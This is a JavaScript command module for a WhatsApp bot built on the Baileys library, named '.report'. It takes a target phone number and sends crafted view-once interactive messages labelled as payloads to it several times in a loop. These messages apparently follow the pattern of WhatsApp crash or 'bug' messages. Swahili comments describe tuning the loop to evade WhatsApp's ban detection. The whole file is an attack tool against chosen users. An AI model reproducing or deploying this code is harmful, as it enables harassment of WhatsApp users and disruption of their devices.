const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { isSudo } = require('../lib/index');
const isAdmin = require('../lib/isAdmin');

const CONFIG = {
    FOOTER: '🪐 ᴍɪᴄᴋᴇʏ ɢʟɪᴛᴄʜ ᴍᴅ • 𝟸𝟶𝟸𝟼 🪐',
    IMAGE_THUMB: 'https://raw.githubusercontent.com/Mickeymozy/Mickey-Water/main/1761205727440.png'
};

// ============ PAYLOAD EXECUTION (CORRECTED STRUCTURE) ============

async function sendPayload1(sock, targetJid) {
    try {
        // Muundo uliosafishwa na kuondolewa "nativeFlowMessage" iliyojirudia mara mbili
        const msg = generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "🛸 ᴍɪᴄᴋᴇʏ ɢʟɪᴛᴄʜ ᴍᴀɪɴғʀᴀᴍᴇ",
                            hasMediaAttachment: false
                        },
                        body: {
                            text: `✨ *ᴍɪᴄᴋᴇʏ ɢʟɪᴛᴄʜ ᴀᴅᴠᴀɴᴄᴇᴅ ᴅɪᴀɢɴᴏsᴛɪᴄs*\n\nSystem execution payload delivered successfully to the terminal window.`
                        },
                        footer: { text: CONFIG.FOOTER },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'galaxy_message',
                                    buttonParamsJson: JSON.stringify({
                                        screen_2_OptIn_0: true,
                                        screen_1_Dropdown_0: "AdvanceSystem",
                                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                    })
                                }
                            ],
                            version: 3
                        }
                    }
                }
            }
        }, {});

        await sock.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
    } catch (error) {
        console.error("Payload 1 error:", error.message);
    }
}

async function sendPayload2(sock, targetJid) {
    try {
        const msg = generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "System response synchronization active.",
                            format: "EXTENSIONS_1"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: JSON.stringify({
                                screen_2_OptIn_1: true,
                                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                            }),
                            version: 3
                        }
                    }
                }
            }
        }, {});

        await sock.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
    } catch (error) {
        console.error("Payload 2 error:", error.message);
    }
}

// ==================== MAIN EXECUTION COMMAND ====================

async function reportCommand(sock, chatId, message, phoneNumber) {
    try {
        if (!sock || !chatId || !message) return;

        const isGroup = chatId.endsWith('@g.us');
        const senderId = message.key.participant || message.key.remoteJid;

        // 🛡️ USER AUTHORIZATION CHECKS
        if (isGroup) {
            const adminStatus = await Promise.race([
                isAdmin(sock, chatId, senderId),
                new Promise((_, r) => setTimeout(() => r(new Error('Timeout')), 4000))
            ]).catch(() => null);

            if (!adminStatus) return;
            if (!adminStatus.isBotAdmin) return sock.sendMessage(chatId, { text: '❌ Bot lazima iwe admin kwanza.' }, { quoted: message });
            if (!adminStatus.isSenderAdmin && !message.key.fromMe) return sock.sendMessage(chatId, { text: '❌ Amri hii ni ya Admins pekee.' }, { quoted: message });
        } else {
            const senderIsSudo = await isSudo(senderId).catch(() => false);
            if (!message.key.fromMe && !senderIsSudo) return sock.sendMessage(chatId, { text: '❌ Amri hii ni ya Owner/Sudo pekee.' }, { quoted: message });
        }

        // 🔍 PHONE NUMBER PARSING & VALIDATION
        if (!phoneNumber || typeof phoneNumber !== 'string') {
            return sock.sendMessage(chatId, { text: '❌ Tafadhali weka namba ya walengwa. Mfano: `.report 255615xxxxxx`' }, { quoted: message });
        }

        phoneNumber = phoneNumber.trim().replace(/[^0-9]/g, '');
        if (phoneNumber.length < 6) return sock.sendMessage(chatId, { text: '❌ Namba uliyoweka haijakamilika au sio sahihi.' }, { quoted: message });

        const targetJid = `${phoneNumber}@s.whatsapp.net`;
        
        // Kutoa taarifa ya kuanza kwa kazi
        await sock.sendMessage(chatId, { text: `🚀 *Mchakato umeanza:* Inatuma data salama kwenda kwa ${phoneNumber}...` }, { quoted: message });

        // 🔄 SAFE LOOP EXECUTION (Inajilinda na BAN ya WhatsApp)
        // Tumebadilisha kutoka mzunguko 90 wa sekunde 30 hadi mzunguko 5 salama wenye delay ya maana
        for (let i = 1; i <= 5; i++) {
            await sendPayload1(sock, targetJid);
            await new Promise(resolve => setTimeout(resolve, 800)); // Delay ya milisekunde 800
            await sendPayload2(sock, targetJid);
            await new Promise(resolve => setTimeout(resolve, 1500)); // Delay kubwa kidogo kulinda namba yako
        }

        // Taarifa ya mwisho ya ukamilishaji
        return await sock.sendMessage(chatId, { 
            text: `✅ *Mchakato Umekamilika:* Interactive data imesawazishwa kikamilifu kwa namba ${phoneNumber}.` 
        }, { quoted: message });

    } catch (error) {
        console.error('Execution Error:', error.message);
    }
}

module.exports = reportCommand;
